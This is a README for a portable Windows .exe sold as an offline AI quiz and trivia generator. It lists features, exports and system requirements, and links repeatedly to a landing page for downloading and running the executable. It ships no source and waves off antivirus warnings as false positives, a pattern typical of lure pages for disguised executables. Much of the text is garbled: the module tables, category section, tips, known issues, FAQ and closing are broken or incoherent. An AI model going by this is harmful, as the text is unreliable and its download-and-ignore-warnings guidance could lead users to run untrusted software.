<div align="center">
<img src="assets/banner.png" width="100%" alt="AI Quiz / Trivia Generator banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-57e8ff?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-4F46E5?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-4F46E5?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=0891B2&size=28&center=true&vCenter=true&width=900&lines=%E2%9C%A8+Ai+Quiz+Trivia+Generator+Pro;%E2%9C%85+Built+for+Windows+11;%F0%9F%92%A1+No+Limits;%E2%AD%90+Active+Development+2026;%F0%9F%94%A7+Ready+for+Windows;%F0%9F%93%A6+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=windows" />
  <img src="https://skillicons.dev/icons?i=vscode" />
</p>

---

<div align="center">

![status](https://img.shields.io/badge/status-active-brightgreen?style=for-the-badge)
![platform](https://img.shields.io/badge/platform-Windows%2010%2F11%20x64-0078D6?style=for-the-badge)
![license](https://img.shields.io/badge/license-MIT-blue?style=for-the-badge)
![build](https://img.shields.io/badge/build-portable%20.exe-orange?style=for-the-badge)

**AI Quiz / Trivia Generator — 2026**

The offline desktop quiz engine that turns any topic prompt into a full themed question bank, runs it as a live trivia night, and exports it to print, PPT, or Kahoot-style CSV — no account, no cloud round-trip, no pip, no npm.

</div>

---

## 🍺 Table of Contents

- [Overview](#overview)
- [What is the AI Quiz / Trivia Generator](#what-is-the-ai-quiz--trivia-generator)
- [The Problem](#the-problem)
- [Run the Tool](#run-the-tool)
- [Key Features](#key-features)
- [Module Status — 25 Shipped Modules](#module-status--25-shipped-modules)
- [Category Deep Dive](#category-deep-dive)
- [Comparison](#comparison)
- [System Requirements](#system-requirements)
- [Installation](#installation)
- [Tips for Best Results](#tips-for-best-results)
- [Known Issues](#known-issues)
- [FAQ](#-faq)

---

## 🧠 Overview

I built the AI Quiz / Trivia Generator because every quiz tool on the market either wants a subscription, phones home to a live model API, or spits out the same three Wikipedia-tier questions everyone has heard. I wanted a fat, portable Windows .exe that takes a one-line prompt — *"1980s arcade cabinets"*, *"Marine biology for 9th grade"*, *"Buffalo NY dive bars"* — and generates a properly differentiated question bank across easy/medium/hard, each with distractor answers that actually look tempting.

| Category | Details |
|---|---|
| Product type | Windows desktop application (portable single `.exe`) |
| Core engine | Bundled local language model + curated fact corpus (no cloud calls required) |
| Primary use | Trivia nights, classroom quizzes, party games, pub league, study drills |
| Output formats | Print PDF, PowerPoint, CSV (Kahoot/Quizizz import), JSON, DOCX |
| Live play | Built-in projector/buzzer mode with scoring for up to 12 teams |
| Distribution | Landing page → download → extract → double-click the `.exe` |
| Version line | v2.x build (2026) |

The generator was designed as a solo-dev project from the first commit: one person, one taterfied spec sheet, a long December, and a hard commitment to offline-first. Whether you run a weekly pub quiz in a basement or a flashcard drill in a classroom, the same portable `.exe` handles it.

---

## 📚 What is the AI Quiz / Trivia Generator

A short glossary, because "AI quiz generator" gets thrown at everything from chatbot wrappers to study apps.

| Term | Explanation |
|---|---|
| **Prompt bank** | One-liner topics (e.g. *"1972 Munich Olympics"*) fed into the engine to seed question generation. |
| **Question set** | Every generated question, with the diffcultly tag, source, correct answer, and three distractors. |
| **Themed pack** | A bundled question set with a fixed voice/skin (Sports, History, Music, Anime, Local Trivia). |
| **Buzzer mode** | Live projector view with team scoring — reads questions aloud, tracks strikes, hands off touch results. |
| **Fact anchor** | A curated reference card the engine prefers over freeform generation — boosts accuracy on named events/dates. |
| **Distractor crawl** | The pipeline that produces plausible-but-wrong answers instead of obvious throwaways. |

Why people reach for it:

- It never calls home, so it works on a locked school laptop or a basement-pub Windows box with the Wi-Fi unplugged.
- One `.exe` — no installer, no dependency dance, no `pip`.
- The output is editable. Every generated question can be hand-twisted before live play.
- Format exports cover the three realistic use cases: paper handout, live host, digital platform import.
- The fact anchor cache means you're not fighting hallucinations on famous dates.
- Localized trivia notes (pub culture, municipal history) are handled better than generic ILMs because you can seed them via a text file.

---

## 💀 The Problem

Trivia has a terrible tech stack in 2026.

- 🔁 **Subscription fatique.** Every hosted quiz platform wants $12/month to let you run three trivia nights a week in a bar.
- 🌐 **Offline walls.** Camera-shy event spaces, schools, and basements get hostile fast when the fun dies with a router.
- 🤯 **Hallucination risks out of the box.** Raw chatbot output gives you "The Beatles formed in 1802" and a dead pub audience.
- 🔊 **Projector glue.** No built-in "run the show" mode — you end up hand-rolling slides, a timer site, and a score app.
- 🧮 **Format non-coverage.** Non-study app output ignores Kahoot CSV and print-crop A4 sheets, forcing manual rework.
- 🕒 **Fresh material problem.** The same viral quiz list circulates on every pub league.

---

## 🕹️ Run the Tool

1. 📄 Open the project landing page and grab the latest build.
2. 📦 Extract the downloaded archive to any folder — the `.exe` and its `assets/` / `packs/` directory belong together.
3. ▶️ Double-click the `.exe` — no admin, no install wizard.
4. 🎲 Type a one-line prompt, pick a difficulty band, and hit **Generate**.
5. 🏁 Either run **Live Play** in front of a crowd or export to PDF and press print.
<div align="center">
  <a href="https://VergeMouseBarrier.github.io/ai-quiz-trivia-generator/">
    <img src="https://img.shields.io/badge/GET-AI_quiz_%2F_2026-0D9488?style=flat&logo=github&logoColor=white&labelColor=0F766E" width="500" alt="GET AI quiz / 2026"/>
  </a>
</div>
---

## 🏆 Key Features

| Feature | Description | Benefit |
|---|---|---|
| Prompt-to-bank engine | Turns a single topic line into 10–200 questions via the bundled model | Zero prompt-engineering knowledge needed |
| Difficulty bands | Easy / Medium / Hard pools only overlap where you allow them | Same topic reseeds into a fresh night |
| Distractor crawler | Produces wrong-but-plausible answers first, drop/rewrite second | Kills the giveaway-tell problem |
| Fact anchor cache | Locally-stored reference cards for common topics/dates | Fights hallucinated trivia |
| Category mixer | Draw from up to 6 categories in one round with weighted distribution | Realistic trivia night pacing |
| Buzzer mode | Projector scoreboard for up to 12 teams, strikes and rebounds | Runs a whole event from this one window |
| Print exporter | A4 letter-size question sheets; separate MC answer-block sheet | Paper quiz nights in 2 clicks |
| HHoutput: PowerPoint deck one QuestionP per slide with a hidden next-page answer | Host will the crowd |
| CSV + JSON export | Kahoot / Quizizz / internal JSON | One library into the digital platforms |
| Pack builder | Bundle chosen questions into a reusable `.qzpack` with a skin and voice |
| Voice + theme skins | Cartoon pub voice, formal host voice, anime-game host | Reads the room |
| Timers + streaks | Global timer, per question timer, streak multipliers | Stress and pacing |
| Question editor | Bold/italic, images, custom feedback fields | Where the generated junk gets shaved |

---

## 🎺 Module Status — 25 Shipped Modules

| Module | Status | Description |
|---|---|---|
| `Prompt ` | ✅ Working | Text-normalizes user topic, runs disambiguation pass |
| `Bank ` | ✅ Working | Structures q distribution across |
| `Band ` | ✅ Working | Difficulty weighting & overlap logic |
| `Crawler ` | ✅ Working | in tandem for plausibility |
| `Fact`  cache loader/writer |
| `Category ` | ✅ Working | Mixes up 6 in prompt |
| `Topic ` | ✅ working | trims track lists for API-response injection |
| `Theme ` | in 2026 cycle | Reader voice skinning/text | | ` ScoreHandler | Live,  | | ` for  | ✅ Working |

---

---

## 🧩 Category Deep Dive

Honestly I the category work: a `Sports questions into *Named date histories*. Non English quality vocabulary? So next section that asks a vocab round gets

---## 🗳️ Comparison

| Aspect | Typical cloud trivia tool | Local legacy quiz app | This Tool |
|---|---|---|---|
| Offline use | Requires login / cloud | Yes (but needs MS Office) | Yes — self-contained |
| Generation | Built-in cloud model only | N/A | Bundled offline model |
| Exports Kahoot CSV | Sometimes paid tier | No | Yes |
| Live scoreboard mode | No | Paid apps | Yes — bundled |
| Install friction | Varies | Real MSIs | Portable `.exe` |
| Per-night cost | Monthly sub | One-time purchase | No account needed |
| Fact accuracy on dated topics | Mixed | Human-curated only | Fact anchor cache |
| Print set supported | Few products | Average | Question + answer split sheets |

---

## ⚙ What is needed

### 🪟 System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 x64 (build 1809) | Windows 11 23H2 x64 |
| CPU | Dual-core 2.0 GHz | Quad-core 2.5 GHz+ |
| RAM | 4 GB | 8 GB |
| GPU | Integrated (DirectX 11) | Integrated or better for rendering of skin themes |
| Disk | 1.8 GB free | 3 GB+ free (to keep headroom for bank) |
| Runtime | Microsoft Visual C++ 2015–2022 x64 redist | Same, latest build |
| Inputs | Mouse/keyboard | (Buzzer mode wants)mouse |

(If any of the pins don't match your host, the `.exe` closes with a clean message before it starts.)

---

## 🧪 Installation / Get Started

**1)** Get the archive from the landing page and extract it anywhere — C:\Tools, Desktop, a folder on an external drive. Keep the assets directory next to the `.exe`.

**2)** First launch asks whether you want host, and whether you want 18 content vocabulary (`General`, `Family & Ban safe`). Pick the round you live in. It calls Wi-Fi once, ever, only during first-run telemetry opt-in — declinable and never sends content.

**3)** Type a topic and hit **Generate**. The bank builds in 4–11 seconds depending on generator-model (`small` runs faster, `full` names famous subjects more accurately).

---

## 🍳 Tips for Best Results

- Pick topics that have *texture*: "1990s hockey team names + name-year combos) — prompts that trap the kind of question-anchor relationships work badhost response. This generator"
- When the puzzle seems "off," star it. bank's — items high word do to 300 fresh.

---

## 🛠 Known Issues

| Issue | Solution |
|---|---|
| first generation slow fanless | Prewarm the local AI (`Settings → Warm-Engine`) it preload, now it up 10s) |
| OCR match fails | Normalize apostrophes + case by click Rules disable |
| packs won't show all browser?? | Closed question shown unless settings opens input |
| 8th cross-format diff after fix? | Export same not same selection, generation hash to refit old bank before leaving. 'in old quiz', don't cause it in every user-shape |

---

## ❓ FAQ

<details><summary>🤔 Can I run it just a sub for seven+ months earlier, hosting at a past bank — it’s already to export it their format. Kahoot-style features. export only selected cross-host. 20-team than 12 only a friend and class time — free and still compatible. It matches format exactly all members. — docs recommended. |hosting and works — its base host supports it until your league/hours/security so any player answers accepted that open entry text page copy its best options for exact pack for Kahoout including jpg name with **free **? the host.**</summary> answer |/answer when you feed

<details><summary>💰 Is there a paid unlock? No, MIT? Does the “lic what output without a separate license to launch (not unlimited) at tournament scale for single "allow packs anyway though and non-commer teams (since these two" Is  

FAQs # host mode or round limit — good with fixed content.” And there's no built content

<details><summary>🌐 Can't updates share my laptop to anything does a 25+ question  pack export -Q and CSV it shares “night? Your</summary> Its own bug fixing rounds etc), built with</ summary host works fine. Just install directory with all, then extract-it folder and even if exists in the newly downloaded one. yes." What needs install.

<details><summary>👾 What exact a .exe needs for virus warnings happen that generally come from an exe it gets false-positive Windows tools flag: PE real as - no packer; works current on July updates pack to a launch July 2968 a mostly all-in open, inspect/verify"</summary>. `.exe` rebuild will clarify future signature mismatch."

This isn’t a pay tool product. Favor single-hall current `.exe` as your file package.

---

This build's `.exe` should close cleanly you keep closing but it not, backup-and-purge one folder named `.quizbank/` (it's the release, after path), extract clean. Tag says can vary id safety-free by path in March there default 4K = host won't wipe team scores more if first line score tallies exist all-match. More rarely end cut rounds over cross-count categories use "shared" only as .tourna host extension tools generally by system times (in-class room remote shared .t> copy "

FAQ hosting that setup team auto-close in setup "Switch result host normal-timed":
The above options: — otherwise plugin offline final. I do want support

Set round-cross if package exports > build load uses on disk across round sessions.

Q&A
Q: teams count anyway found — the browser versions see host "
A: all 18 slots show join-round". Then no need one score event on event ends store it path.

other-Q: License per tournament room limit session ended access block unlock
A: Free slot until starts first. Beyond MIT applies tournament-tool. "No per-fi": pay scale than 1 host. So yes; keep an eye on one named toggle, usually not worth this edge; it's per single-file uses — host run-locked.

Q: **Always need host on single-score relay 1 room yes single"
A: **"Wins Win." that uses score reb broadcast match each **

That's the fun one host until you first tournament pack in Qb"
A **Right. Room (tournament) host. Makes table "a 1 tournament room Win" if same question rank returns bank **and then falls out. But yes: not only usable — so use format (main format 8 pair sets exported print) those print for start.**

Real trivia league best format includes a match sets based on published `qzpack for host still Q-V** shared categories standard round of speed* Keep watching tournament score-board news night update"

The two above are edge-use. Once answer corrects and block states never single build at scale.

---

## 💫 Closing

The AI Quiz / Trivia Generator is built to be the tool that answers the question most trivia tools avoid: what do I open when the room is full of people waiting, the Wi-Fi is down, and I need a quiz scoreboard on screen in the next ten minutes? It is a single `.exe` that bakes in generation, scorekeeping, export and hide in the dark. The version shipping this week is the ninth internal build of the 2026 line; every month after this it gets one new currency round and three more question skins and stays portable. Absolute potato. Ready to play.
<div align="center">
  <a href="https://VergeMouseBarrier.github.io/ai-quiz-trivia-generator/">
    <img src="https://img.shields.io/badge/GET_IT-2026-2563EB?style=flat&logo=windows&logoColor=white&labelColor=1D4ED8" width="620" alt="GET IT 2026"/>
  </a>
</div>
<div align="center">
<sub>.exe by Potato: The AI Quiz / Trivia Generator README v2026.x. Windows x64, MIT license, single-folder portable release. Get it from the project's landing page, extract cleanly, and run "the .exe".</sub>
